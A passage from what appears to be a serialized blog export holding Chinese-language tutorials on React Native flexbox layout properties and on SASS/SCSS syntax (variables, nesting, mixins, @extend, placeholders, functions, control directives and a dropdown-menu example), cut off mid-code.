class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;&#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'column'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'stretch'</span>,</span><br><span class=\"line\">      &#125;&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'powderblue'</span>&#125;&#125; &gt;</span><br><span class=\"line\">          &lt;Text style=&#123;&#123;<span class=\"attr\">alignSelf</span>: <span class=\"string\">'flex-end'</span>,<span class=\"attr\">weight</span>: <span class=\"number\">50</span>, <span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'red'</span>&#125;&#125; &gt;子内容&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">50</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'skyblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">100</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'steelblue'</span>&#125;&#125; /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><strong>alignSelf: <code>flex-start|flex-end|center|stretch</code></strong></p>\n<p><img src=\"/view/posts/e61ae078/image-20200326160914205.png\" alt=\"image-20200326160914205\" style=\"zoom:50%;\"></p>\n<h3 id=\"Align-Content\"><a href=\"#Align-Content\" class=\"headerlink\" title=\"Align Content\"></a>Align Content</h3><p>alignContent定义沿横轴的线分布。 仅当使用flexWrap将项目包装到多行时，此功能才有效。</p>\n<ul>\n<li><code>flex-start</code>（默认值）将换行对齐到容器横轴的起点。</li>\n<li><code>flex-end</code>将换行对齐到容器横轴的末端。</li>\n<li><code>stretch</code> 包装线以匹配容器横轴的高度。</li>\n<li><code>center</code>将包装线对齐到容器横轴的中心。</li>\n<li><code>space-between</code>在容器的主轴上均匀间隔的线，在线之间分配剩余空间。</li>\n<li><code>space-around</code>在容器的主轴上均匀间隔地包裹线，在线周围分配剩余空间。 与使用空格之间的空间相比，周围的空间将导致空间分配到第一行的开头和最后一行的末尾。</li>\n<li><code>space-evenly</code> 沿主轴均匀地分布在对齐容器内。 每对相邻项之间的间距，主开始边缘和第一个项目以及主结束边缘和最后一个项目都完全相同。</li>\n</ul>\n<p><img src=\"/view/posts/e61ae078/image-20200331154557560.png\" alt=\"image-20200331154557560\" style=\"zoom:67%;\"></p>\n<h3 id=\"Flex-Wrap\"><a href=\"#Flex-Wrap\" class=\"headerlink\" title=\"Flex Wrap\"></a>Flex Wrap</h3><p>flexWrap属性在容器上设置，并控制当子原生沿主轴溢出容器大小时发生的情况。 默认情况下，子级被强制为一行（可以收缩元素）。 如果允许包装，则根据需要将项目沿主轴包装成多行。</p>\n<p>换行时，可以使用alignContent指定行在容器中的放置方式。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200331154722643.png\" alt=\"image-20200331154722643\" style=\"zoom:50%;\"></p>\n<h3 id=\"Flex-Basis-Grow-and-Shrink\"><a href=\"#Flex-Basis-Grow-and-Shrink\" class=\"headerlink\" title=\"Flex Basis, Grow, and Shrink\"></a>Flex Basis, Grow, and Shrink</h3><ul>\n<li><p>flexGrow描述如何沿主轴在容器的子级之间分配容器中的任何空间。 布置好其子项后，容器将根据其子项指定的伸缩增长值分配所有剩余空间。</p>\n<ul>\n<li>flexGrow接受任何大于等于0的浮点值，其中0为默认值。 容器将在孩子之间分配剩余空间，该剩余空间将根据孩子的弹性增长值来加权。</li>\n</ul>\n</li>\n<li><p>flexShrink描述了在子项的总大小溢出主轴上容器大小的情况下如何沿主轴收缩子项。 Flex收缩与Flex增长非常相似，如果任何溢出大小都被视为负剩余空间，则可以用相同的方式来考虑。 通过允许孩子根据需要生长和收缩，这两个属性也可以很好地协同工作。</p>\n<ul>\n<li>Flex收缩接受任何大于等于0的浮点值，默认值为1。 容器将根据其子项的flex收缩值对子项进行收缩。</li>\n</ul>\n</li>\n<li><p>flexBasis是一种与轴无关的方式，用于沿主轴提供项目的默认大小。 如果子项的父级是具有flexDirection：row的容器，则设置子项的flex基础类似于设置子项的宽度；如果子项的父级是具有flexDirection：列的容器，则设置子项的高度。 项目的伸缩基础是该项目的默认大小，即执行任何伸缩增长和伸缩收缩计算之前的项目大小。</p>\n</li>\n</ul>\n<h3 id=\"宽度和高度\"><a href=\"#宽度和高度\" class=\"headerlink\" title=\"宽度和高度\"></a>宽度和高度</h3><p>Yoga中的width属性指定元素内容区域的宽度。 同样，height属性指定元素内容区域的高度。</p>\n<p>宽度和高度都可以采用以下值：</p>\n<ul>\n<li><p>auto是默认值，React Native根据元素的内容（无论是其他子元素，文本还是图像）计算元素的宽度/高度。</p>\n</li>\n<li><p>pixel定义宽度/高度，以绝对像素为单位。 根据组件上设置的其他样式，这可能是节点的最终尺寸，也可能不是。</p>\n</li>\n<li><p>percent定义宽度或高度，以其父级宽度或高度的百分比表示。</p>\n</li>\n</ul>\n<h3 id=\"绝对和相对布局\"><a href=\"#绝对和相对布局\" class=\"headerlink\" title=\"绝对和相对布局\"></a>绝对和相对布局</h3><p>元素的位置类型定义了元素在其父元素中的位置。</p>\n<p>相对（默认值）默认情况下，元素是相对放置的。 这意味着元素将根据布局的正常流程进行定位，然后根据上，右，下和左的值相对于该位置偏移。 偏移量不会影响任何同级元素或父元素的位置。</p>\n<p>绝对当绝对定位时，元素不参与正常的布局流程。 相反，它的布局与兄弟姐妹无关。 根据顶部，右侧，底部和左侧的值确定位置。</p>\n<p><img src=\"/view/posts/e61ae078/image-20200331155044160.png\" alt=\"image-20200331155044160\" style=\"zoom:50%;\"></p>\n"},{"title":"SASS","abbrlink":"ea50967e","date":"2020-03-24T00:19:20.000Z","_content":"\n# SASS\n\n## 什么是SASS\n\n​\tSASS 是一种基于 CSS 的预处理语言，他在CSS的语法的基础上增加了变量(variables)\\嵌套(nested rules)、混合(mixins)、导入(inline import)等高级功能，这样在开发项目是便于管理整体项目的样式风格。\n\n### SASS的特征\n\n- 完全兼容 CSS3\n- 在 CSS 基础上增加变量、嵌套 (nesting)、混合 (mixins) 等功能\n- 通过函数进行颜色值与属性值的运算\n- 提供控制指令等高级功能\n- 自定义输出格式\n\n### SASS的语法格式\n\nSASS分为两种语法，一种是SCSS，另一种就是SASS。\n\nSCSS是最新的语法：\n\n+ 扩展名为.scss\n+ SCSS语法规则和CSS的语法规则基本一样，使用大括号{}和分号;来分隔块的样式\n+ 增强了对CSS3语法的支持\n\nSASS是老语法：\n\n+ 扩展名为.sass\n+ SASS语法也称之为SASS的缩进语法，使用缩进和换行来分块，而不是使用分号来分隔语句，和stylus这种预处理语言类似\n\n**现在只学习scss语法**\n\n##SCSS语法\n\n### 变量（Variables）\n\n```scss\n$color: #333;  // 声明变量\n$bgcolor:#f36;\nbody {\n  color: $color; // 引用变量\n  background-color: $bgcolor;\n}\n```\n\n#### 变量默认值!default\n\n```scss\n$color:red;\n$color:blue !default;\np{\n    color:$color; //red\n}\n// 假设变量申明带有!default，如果在此申明之前没有这个变量的申明，则用这个值，\n// 反之如果之前有申明，则用申明的值。\n// 当然如果你先!default申明，然后再申明一次，那就没什么意思了，这就是基本的变量覆盖，第一次申明的有无!default都一样。\n```\n\n\n\n#### 变量用`#{}`包裹\n\n```scss\n$btnClass: btn !default;\n$borderDirection:  top !default;\n\n.#{$btnClass}{\n    border-#{$borderDirection}:1px solid #ccc;\n}\n\n// 解析成的css：\n.btn{\n    border-top:1px solid #ccc;\n}\n```\n\n#### 多个变量一起申明\n\n把多个相关的值写在一个变量里，然后通过`nth($var,index)`来获取第几个值。\n\n```scss\n$linkColor: red blue !default;\na{\n    color:nth($linkColor,1);\n    &:hover{\n        color:nth($linkColor,2);\n    }\n}\n\n// 解析成的css：\na {\n    color: red; \n}\na:hover {\n    color: blue; \n}\n```\n\n\n\n### 嵌套(Nesting)\n\nSASS中的嵌套有两种，一种是选择器的嵌套，另外一种是样式的嵌套。\n\n然而这两种嵌套的目的都是一样的，减少代码量，增强代码的可读性。\n\n#### 选择器的嵌套\n\n```scss\n$color: #333; \n$bgcolor:#f36;\n\nsection {\n  margin: 10px;\n  background-color: #f36;\n  nav {\n    color: $color;\n    height: 25px;\n    a {\n      color: #0982c1;\n      &:hover{\n        text-decoration: underline;\n      }\n    }\n  }\n}\n```\n\n\n\n#### 样式的嵌套\n\n```scss\nli { \n  font: { \n    style:italic; \n    family:serif; \n    weight:bold; \n    size:1.2em; \n  } \n} \n// 当然font属性可以使用css3的合写，那就更简单了\nli { \n  font: serif italic bold 1.2em;\n} \n```\n\n\n\n### Mixins\n\nMixins是SASS中最强大的特性之一，简单点来说，Mixins可以将一部分样式抽出，作为单独定义的模块，被很多选择器重复使用。\n\n```scss\n@mixin error($borderWidth: 2px){\n  border: $borderWidth solid #f00;\n  color: #f00;\n}\n\nspan {\n  @include error(10px)\n}\n```\n\n举例：\n\n```scss\n//Example: @include prefixer(border-radius, $radius, webkit spec);\n//----------------------------------------\n$prefix-for-webkit: true !default;\n$prefix-for-mozilla: true !default;\n$prefix-for-microsoft: true !default;\n$prefix-for-opera: true !default;\n$prefix-for-spec: true !default; // required for keyframe mixin\n//prefixer\n@mixin prefixer ($property, $value, $prefixes) {\n  @each $prefix in $prefixes {\n    @if $prefix == webkit and $prefix-for-webkit == true {\n      -webkit-#{$property}: $value !important;\n    }\n    @else if $prefix == moz and $prefix-for-mozilla == true {\n      -moz-#{$property}: $value;\n    }\n    @else if $prefix == ms and $prefix-for-microsoft == true {\n      -ms-#{$property}: $value;\n    }\n    @else if $prefix == o and $prefix-for-opera == true {\n      -o-#{$property}: $value;\n    }\n    @else if $prefix == spec and $prefix-for-spec == true {      #{$property}: $value;\n    }\n    @else {\n      @warn \"Unrecognized prefix: #{$prefix}\";\n    }\n  }\n}\n\n@mixin skewX($degrees) {\n  @include prefixer(transform, skewX($degrees), webkit moz o ms spec);\n  -webkit-backface-visibility: hidden;\n}\np {\n  @include skewX(45deg)\n}\n```\n\n编译后：\n\n```css\np {\n  -webkit-transform: skewX(45deg) !important;\n  -moz-transform: skewX(45deg);\n  -o-transform: skewX(45deg);\n  -ms-transform: skewX(45deg);\n  transform: skewX(45deg);\n  -webkit-backface-visibility: hidden;\n}\n```\n\n### @extend\n\n假设现在要设计一个普通错误样式与一个严重错误样式，一般会这样写：\n\n```html\n<style>\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n.seriousError {\n  border-width: 3px;\n}\n</style>\n<div class=\"error seriousError\">\n  Oh no! You've been hacked!\n</div>\n\n```\n\n使用`@extend`：\n\n```scss\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n```\n\n**注意@extendh会有一个缺点：**\n\n```scss\n.error {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n// 这是一个其他样式\np .error {\n  color: blue;\n}\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n```\n\n但是在编译后的CSS：\n\n```css\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\np .error, p .seriousError {\n  color: blue;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n\n// 然而你只想实现\n.error, .seriousError {\n  border: 1px #f00;\n  background-color: #fdd;\n}\n\np .error { // 这部分的样式不能干扰到 seriousError\n  color: blue;\n}\n\n.seriousError {\n  border-width: 3px;\n}\n```\n\n所以，通过`@extend`引用的类名，你要有绝对的自信，它从未用在几个地方。\n\n### 嵌套、Mixins和@extend的缺点\n\n嵌套：有可能编译的css层级过深\n\nMixins：Mixins用来指定具体属性值会使css变得臃肿\n\n**Mixins的黄金规则**是将相似的风格定义在一个`@mixin`中。请注意这里的一个关键词**相似的**，另外Mixins主要是用于重用，而不是用来指定具体的属性值。\n\n@extend：`@extend`是可以读取SASS文件中类名，这样就会出现意想不到的问题，如上的`.error`\n\n\n\n### 强大的%placeholders\n\n使用`%`和`@extend`就可以将继承中埋下的地雷给排了。\n\n`%`只是一个占位符，他不是正常的选择器，不像`.classes`或者`#ids`，只要不通过`@extend`调用，他是不会产生任何代码量。\n\n首先使用`%placeholders`定义一个公用样式，类似于`.class`：\n\n```scss\n%placeholders {\n  color: red;\n}\n```\n\n在需要使用的地方通过`@extend`来调用：\n\n```scss\nselector {\n  @extend %placeholders;\n}\n```\n\n举例：\n\n```scss\n@mixin fit-content() {\n    width: -webkit-fit-content;\n    width: -moz-fit-content;\n    width: -o-fit-content;\n    width: -ms-fit-content;\n    width: fit-content;\n}\n\n%clearfix {\n    *zoom: 1;\n    &:after,\n    &:before {\n      content: \"\";\n      display: table;\n    }\n    &:after {\n      clear: both;\n      overflow: hidden;\n    }\n}\n\nnav {\n    display: block;\n    ul {\n        margin: 50px auto;\n        width: 800px;\n        @include fit-content();\n        padding: 0;\n        list-style: none;\n        @extend %clearfix;\n    }\n}\n```\n\n\n\n### @function\n\n@function与@mixin，%这两者的第一点不同在于sass本身就有一些内置的函数，方便我们调用，如强大的color函数；其次就是它返回的是一个值，而不是一段css样式代码什么的。\n\n```scss\n$f00: #f00;\n\n//作为变量值\n$redDark: darken($f00,10%) !default;\n\n//作为属性值\np{\n    color: darken($f00,70%);\n    background-color: $redDark;\n}\n```\n\n#### rgba\n\n分为两种：`rgba($red, $green, $blue, $alpha)`和`rgba($color, $alpha)`。\n\n第一种跟css3一样，不介绍，第二种对我们有点用，实例：\n\n```scss\nrgba(#102030, 0.5) => rgba(16, 32, 48, 0.5)\nrgba(blue, 0.2)    => rgba(0, 0, 255, 0.2)\n```\n\n#### ie-hex-str\n\nie-hex-str($color)\n\n这个函数将一个颜色格式化成ie滤镜使用，在做css3使用滤镜兼容的时候用得上，实例：\n\n```scss\nie-hex-str(#abc) => #FFAABBCC\nie-hex-str(#3322BB) => #FF3322BB\nie-hex-str(rgba(0, 255, 0, 0.5)) => #8000FF00\n```\n\n#### darken\n\ndarken(color,color,amount)\n\n第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。\n\n```scss\ndarken(hsl(25, 100%, 80%), 30%) => hsl(25, 100%, 50%)\ndarken(#800, 20%) => #200\n```\n\n#### lighten\n\nlighten(color,color,amount)\n\n第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。\n\n```scss\nlighten(hsl(0, 0%, 0%), 30%) => hsl(0, 0, 30)\nlighten(#800, 20%) => #e00\n```\n\n#### percentage\n\npercentage($value)： 将一个没有单位的数字转成百分比形式\n\n```scss\npercentage(0.2) => 20%\npercentage(100px / 50px) => 200%\n```\n\n#### length\n\nlength($list)\n\n返回一个列表的长度\n\n```scss\nlength(10px) => 1\nlength(#514721 #FFF6BF #FFD324) => 3\n```\n\n#### nth\n\nnth(list,list,n);\n\n返回列表里面第n个位置的值\n\n```scss\nnth(10px 20px 30px, 1) => 10px\nnth((Helvetica, Arial, sans-serif), 3) => sans-serif\n```\n\n#### unit\n\nunit($number)\n\n得到这个数的单位\n\n```scss\nunit(100) => \"\"\nunit(100px) => \"px\"\nunit(3em) => \"em\"\nunit(10px * 5em) => \"em*px\"\nunit(10px * 5em / 30cm / 1rem) => \"em*px/cm*rem\"\n```\n\n#### unitless\n\nunitless($number)\n\n返回这个数是否没有单位\n\n```scss\nunitless(100) => true\nunitless(100px) => false\n```\n\n#### 三目判断\n\nif(condition,condition,if-true, $if-false)\n\n第一个表示条件，第二个表示条件为真的值，第三个表示为假的值\n\n```scss\nif(true, 1px, 2px) => 1px\nif(false, 1px, 2px) => 2px\n```\n\n注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。\n\n你可以把这些用在判断或者属性值里面，那么就是一级棒。\n\n下面我们来搞点自己定义的函数吧，先来个简单的：\n\n```scss\n// px转em\n@function pxToEm($px, $base: 16) {\n  @return ($px / $base) * 1em;\n}\n// 调用下：\np{\n  font-size:pxToEm(20);\n}\n// 解析后的css：\np {\n  font-size: 1.25em;\n}\n```\n\n### @if和@else\n\n```scss\n$filter:false !default; //是否开启ie滤镜\n//背景色半透明\n@mixin bgcolor-alpha($bgcolor: rgba(0,0,0,.5)){\n  color:#fff;\n  @if $filter{\n  filter:progid:DXImageTransform.Microsoft.gradient(enabled='true',startColorstr='#{ie-hex-str($bgcolor)}', endColorstr='#{ie-hex-str($bgcolor)}');\n  }@else{\n    background-color: #333;\n  }\n  background-color:$bgcolor;\n}\n```\n\n这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。\n\n当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用`not,or,and`分别表示非，或，与。\n\n```scss\n$a:   false !default;\n$b:   true !default;\n\n@if not($a){\n  p{\n    color:red;\n  }\n}\n\ndiv{\n  font-size:14px;\n  @if $a or $b{\n    width:300px;\n  }\n}\n\nli{\n  line-height:24px;   \n  @if $a and $b{\n    float:left;\n  }\n}\n```\n\n想想还是漏了个，sass用`==,!=`分别表示等于与不等于。\n\n```scss\n$radius: 5px !default;\n\n.box-border{\n  border:1px solid #ccc;\n  padding:10px;\n\n  @if $radius != 0{\n    border-radius:$radius; \n  }\n}  \n\n$sizeClass: small !default;\n\n.size{\n  @if $sizeClass == 'small'{\n    padding:5px;\n  }@else{\n    padding:10px;\n  }\n}\n```\n\n### @for\n\nfor循环有两种形式，分别为：``@for $var from start through end` 和`@for $var start from to  end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的：\n\n```scss\n@for $i from 1 through 3 {\n  .item-#{$i} { width: 2em * $i; }\n}\n```\n\n### @each\n\n语法：@each $var in\n\n```scss\n@each $animal in puma, sea-slug, egret, salamander {\n  .#{$animal}-icon {\n    background-image: url('/images/#{$animal}.png');\n  }\n}\n```\n\n```scss\n$sprite: puma sea-slug egret salamander !default;\n\n%sprite-animal{\n    background: url('/images/animal.png') no-repeat;\n}\n@each $animal in $sprite {\n    .#{$animal}-icon {\n        @extend %sprite-animal;     \n        background-position:0 -(index($sprite,$animal)*30px);\n    }\n}\n```\n\n使用scss设计按钮样式：\n\n```scss\n//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);\n$btnColorClass: (primary #0078E7 #fff) (blue #00A3CF #fff) (orange #F47837 #fff) !default;\n\n@mixin btn-color($bgColor:#e6e6e6, $textColor:#333){\n  color:$textColor;\n  background-color: $bgColor;\n  border:1px solid darken($bgColor, 5%);\n  border-color:lighten($bgColor, 2%) darken($bgColor, 5%) darken($bgColor, 5%) lighten($bgColor, 2%);\n\n  &:hover{\n    background-color: darken($bgColor,5%);\n    color:$textColor;\n  }\n}\n\n@each $colorClass in $btnColorClass{\n  $class:      nth($colorClass,1);\n  $bgColor:    nth($colorClass,2);\n  $textColor:  nth($colorClass,3);\n  .btn-#{$class}{\n    @include btn-color($bgColor,$textColor);\n  }\n}\n```\n\n\n\n\n\n## @include vs @extend\n\n避免代码重复生成，\n\nSASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过`@include`来调用。但很多时候，我们又不需要这么强大的功能。\n\n这个时候出现`@extend`来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。\n\n为了解除这个隐患，在SASS3.2中增加了一个`%placeholders`功能。让大家能很方便定义一些功能简单的相同样式模块。\n\n通过前面的介绍`@mixin`需要`@include`来调用，而`.class`和`%placeholders`需要`@extend`来调用，那么两者有何区别呢？\n\n- `@include`主要是用来调用`@mixin`定义的函数模块。在`@mixin`中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值；\n- `@extend`主要是用来调用`.class`或者`%placeholders`定义的属性模块；在`.class`或者`%placeholders`中可以定义一个相同样式，但这里面不能定义参数；\n- `@include`每次调用相同的`@mixin`时，编译出来的CSS相同样式不会进行合并；\n- `@extend`每次调用相同的 `.class`时，如果`.class`在样式出现多次，那么编译出来的CSS有可能不是需要的样式；\n- `@extend`每次调用相同的`%placeholders`时，编译出来的CSS相同样式会进行合并。\n\n下面我们通过一个清除浮动的案例，分别看看`@include`和`@extend`之间的区别：\n\n### `@include`与`@mixin`使用例子\n\n```scss\n@mixin clearfix{\n    & {\n      *zoom: 1;\n    }\n    &:before,\n    &:after {\n      display: table;\n      content: \"\";\n    }\n    &:after {\n      clear: both;\n      overflow: hidden;\n    }\n}\n\nul{\n  @include clearfix;\n}\n.block {\n  @include clearfix;\n}\n```\n\n编译后：\n\n```css\nul {\n  *zoom: 1;\n}\nul:before, ul:after {\n  display: table;\n  content: \"\";\n}\nul:after {\n  clear: both;\n  overflow: hidden;\n}\n\n.block {\n  *zoom: 1;\n}\n.block:before, .block:after {\n  display: table;\n  content: \"\";\n}\n.block:after {\n  clear: both;\n  overflow: hidden;\n}\n```\n\n很明显，相同的样式不会进行合并。\n\n### `@include`和`%placeholders`使用例子\n\n```scss\n%clearfix{\n    & {\n      *zoom: 1;\n    }\n    &:before,\n    &:after {\n        display: table;\n        content: \"\";\n    }\n    &:after {\n        clear: both;\n        overflow: hidden;\n    }\n}\n\nul{\n  @extend %clearfix;\n}\n.block {\n  @extend %clearfix;\n}\n```\n\n编译后：\n\n```css\n.block, ul {\n  *zoom: 1;\n}\n.block:before, ul:before, .block:after, ul:after {\n  display: table;\n  content: \"\";\n}\n.block:after, ul:after {\n  clear: both;\n  overflow: hidden;\n}\n```\n\n很明显相同样式代码已经进行合并。\n\n### Mixins与%placeholders的结合\n\nMixins如果使用不当，就会产生很多重复的代码，但仅用`@extend`很多时候又无法达到功能上的需求。\n\n那么有没有方法能把Mixins与`%placeholders`结合起来，取他们各自的优势呢？\n\n大家都知道,`%placeholders`就类似于CSS中的`.classes`或者`#ids`，只不过使用`%`代替了`.`和`#`。但`%placeholders`中的代码只有通过 `@extend`调用之后才会产生代码量，不然他是不会产生任何代码量。\n\n下面我们来看一个Mixins与`%placeholders`结合在一起制作的一个网格系统。\n\n```scss\n%grid {\n  box-sizing: border-box;\n  display: inline-block;\n  padding-left: 1em;\n  padding-right: 1em;\n}\n\n@mixin grid($width: 1){\n  @extend %grid;\n  width: percentage($width);\n}\n\n.grid-half {\n  @include grid(1 / 2);\n}\n\n.grid-third {\n  @include grid(1 / 3);\n}\n```\n\n按照这样的方法，我们可以制作出一个简单的百分比网格系统：\n\n```scss\n$columns: 12;\n$gutter: 2em;\n\n%grid {\n  box-sizing: border-box;\n  display: inline-block;\n  padding: {\n    left:$gutter / 2;\n    right:$gutter / 2;\n  }   \n}\n\n@mixin grid($width: 1){\n  @extend %grid;\n  width: percentage($width);\n}\n\n@for $column from 1 through $columns {\n  .grid-#{$column} {\n    @include grid(1 / $column);\n  }\n}\n```\n\n\n\n## 使用Mixins和继承的细节\n\n了解了`@include`定义的`@mixin`,`@extend`定义的`.class`和`@extend`定义的`%placeholders`差异之后，我们在写SASS时，有一些细节大家应该了解：\n\n- 不要使用没有设置参数的`@mixin`，他们应该是`.class`或者`%placeholders`;\n- 不要轻意（从不使用）`@extend`调用`.class`。会得到你意想不到的结果，特别是定义的`.class`出现在嵌套或其他的样式表中，你应该使用`@extend`调用`%placeholders`;\n- 不要使用太深的选择器嵌套。\n- 如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低；\n- 不要使用子选择器符号`>`，在SASS中很无效；\n- 不要使用同史选择器`+`，配合你当前的标记他是非常无效。\n- 不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差；\n\n## 案例实战\n\n![案例实战](SCSS/%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98.gif)\n\n1.`html`结构\n\n```html\n<ul class=\"menu\">\n  <li><a href=\"\">首页</a></li>\n  <li>\n    <a href=\"\">博客</a>\n    <ul class=\"drop-menu\">\n      <li><a href=\"\">CSS3</a></li>\n      <li><a href=\"\">SASS</a></li>\n      <li><a href=\"\">JavaScript</a></li>\n      <li><a href=\"\">jQuery</a></li>\n    </ul>\n  </li>\n  <li><a href=\"\">案例</a></li>\n  <li><a href=\"\">资源</a></li>\n  <li><a href=\"\">前端收藏夹</a></li>\n</ul>\n```\n\n有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下：\n\n- **定义变量**：我要定义几个变量，方便换成别的风格；\n- **清除浮动**：列表使用了浮动，需要清除浮动\n- **清除列表默认样式**：导航是使用ul制作，所以需要清除其默认样式\n- **定义transfrom**：效果中使用到了CSS3的transform，使用`@mixin`定义成一个模块\n- **定义transition**：下拉菜单出现的时候有一个transition效果\n- **定义fit-content**：使用CSS3的fit-content\n- **定义box-shadow**：使用CSS3的box-shadow\n- **定义文本**：设置菜单项文本效果\n\n1. 定义变量\n\n```scss\n//1.定义变量\n$color: #fff !default; //设置文本颜色\n$bgColor: #34495e !default;//设置背景色\n$sfbgColor: #e74c3c !default;//设置悬浮背景色\n$fontSize: 14px !default;//设置字号\n$fontFamily: Arial, Helvetica !default;//设置字体\n$width: 462px !default; //设置默认宽度\n```\n\n2. 清除浮动\n\n```scss\n//2.使用%placeholders定义清除浮动\n%clearfix {\n  &{\n    *zoom: 1;\n  }\n  &:before,\n  &:after{\n    content: \"\";\n    display: table;\n  }\n  &:after {\n    clear: both;\n    overflow: hidden;\n  }\n```\n\n3. 清除列表默认样式\n\n```scss\n//3.清除列表默认样式\n%listStyle {\n  margin: 0;\n  padding: 0;    list-style: none outside none;\n}\n\n$prefix-for-webkit: true !default;\n$prefix-for-mozilla: true !default;\n$prefix-for-microsoft: true !default;\n$prefix-for-opera: true !default;\n$prefix-for-spec: true !default; \n```\n\n4. 定义transfrom\n\n```scss\n// 4.浏览器前缀\n@mixin prefixer ($property, $value, $prefixes) {\n  @each $prefix in $prefixes {\n    @if $prefix == webkit and $prefix-for-webkit == true {\n      -webkit-#{$property}: $value;\n    } @else if $prefix == moz and $prefix-for-mozilla == true {\n      -moz-#{$property}: $value;\n    } @else if $prefix == ms and $prefix-for-microsoft == true {\n      -ms-#{$property}: $value;\n    } @else if $prefix == o and $prefix-for-opera == true {\n      -o-#{$property}: $value;\n    } @else if $prefix == spec and $prefix-for-spec == true {\n      #{$property}: $value;\n    } @else {\n      @warn \"Unrecognized prefix: #{$prefix}\";\n    }\n  }\n}\n```\n\n5. 定义transition\n\n```scss\n//5.定义transform\n//示例: @include prefixer(border-radius, $radius, webkit spec);\n//Transform, transform-origin, transform-style\n//----------------------------------------\n@mixin transform($property...) {\n  @include prefixer(transform, $property, webkit moz o ms spec);\n}\n\n@mixin transform-origin($axes: 50%) {\n  // x-axis - left | center | right  | length | %\n  // y-axis - top  | center | bottom | length | %\n  // z-axis - length\n  @include prefixer(transform-origin, $axes, webkit moz o ms spec);\n}\n\n@mixin skewX($degrees) {\n  @include prefixer(transform, skewX($degrees), webkit moz o ms spec);\n  -webkit-backface-visibility: hidden;\n}\n\n```\n\n6. 定义fit-content\n\n```scss\n//6.定义transition\n// Return vendor-prefixed property names if appropriate\n// Example: transition-property-names((transform, color, background), moz) -> -moz-transform, color, background//----------------------------------------\n@function transition-property-names($props, $vendor: false) {\n  $new-props: ();\n  @each $prop in $props {\n    $new-props: append($new-props, transition-property-name($prop, $vendor), comma);\n  }\n  @return $new-props;\n}\n@function transition-property-name($prop, $vendor: false) {\n  // put other properties that need to be prefixed here aswell\n  @if $vendor and $prop == transform {\n    @return unquote('-'+$vendor+'-'+$prop);\n  }\n  @else {\n    @return $prop;\n  }\n}\n// transition\n//----------------------------------------\n@mixin transition ($properties...) {\n  @if length($properties) >= 1 {\n    @include prefixer(transition, $properties, webkit moz o ms spec);\n  } @else {\n    $properties: all 0.15s ease-out 0;\n    @include prefixer(transition, $properties, webkit moz o ms spec);\n  }\n}\n\n```\n\n7. 定义fit-content\n\n```scss\n//7.定义fit-content\n@mixin fit-content {\n  width: -webkit-fit-content;\n  width: -moz-fit-content;\n  width: -o-fit-content;\n  width: -ms-fit-content;\n  width: fit-content;\n}\n\n```\n\n8. 定义box-shadow\n\n```scss\n//8.设置box-shadow\n// box-shadow\n@mixin box-shadow($shadow...) {\n  @include prefixer(box-shadow, $shadow, webkit spec);\n}\n```\n\n9. 定义文本\n\n```scss\n//9.设置文本\n%typography {\n  color: $color;\n  text: {\n    decoration: none;\n    align: center;\n  }   \n  font: {\n    family: $fontFamily;\n    size: $fontSize;\n  }\n}\n```\n\n10. 具体样式\n\n```scss\n// 10.具体样式\n.menu {\n  width: $width;\n  @extend %clearfix;//调用清除浮动\n  @extend %listStyle;//调用清除列表样式\n  @include fit-content;\n  margin: 50px auto;\n}\n\n.drop-menu {\n  @extend %listStyle;//调用清除列表样式\n}\n\n.menu > li {\n  background: $bgColor;\n  float: left;\n  position: relative;    @include skewX(25deg);\n}\n\n.menu a {\n  display: block;\n  @extend 